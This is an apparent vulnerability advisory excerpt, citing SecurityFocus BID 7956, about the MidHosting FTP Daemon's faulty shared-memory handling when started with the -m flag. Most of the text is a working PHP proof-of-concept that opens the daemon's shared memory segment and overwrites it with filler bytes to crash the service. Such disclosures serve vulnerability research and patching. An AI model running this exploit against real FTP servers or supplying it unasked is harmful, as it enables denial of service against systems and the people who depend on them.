source: http://www.securityfocus.com/bid/7956/info

It has been reported that MidHosting FTP Daemon does not properly implement shared memory when the m flag (-m) is enabled. Because of this, an attacker could corrupt process memory, causing the service to crash. 

<?php
# mhftpd denial of service

define('SHMSIZE', 16384);

if (($shmid = shmop_open(ftok('/tmp', 'U'), 'w', 0777, SHMSIZE)) == -1) {
die();
}
shmop_write($shmid, str_repeat('A', SHMSIZE), 0);

?> 